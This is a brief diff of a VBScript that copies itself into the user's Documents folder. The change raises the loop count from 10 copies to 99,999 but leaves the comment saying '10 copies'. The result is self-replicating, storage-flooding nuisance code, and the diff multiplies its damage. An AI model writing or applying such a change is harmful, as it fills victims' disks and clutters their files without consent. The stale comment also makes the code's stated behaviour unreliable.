@@ -13,7 +13,7 @@ strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
 strScriptName = fso.GetFileName(WScript.ScriptFullName)
 
 ' Create 10 copies of the script in the Documents folder
-For i = 1 to 10
+For i = 1 to 99999
     strCopyName = "Copy" & i & "_" & strScriptName
     fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & strCopyName, True
     
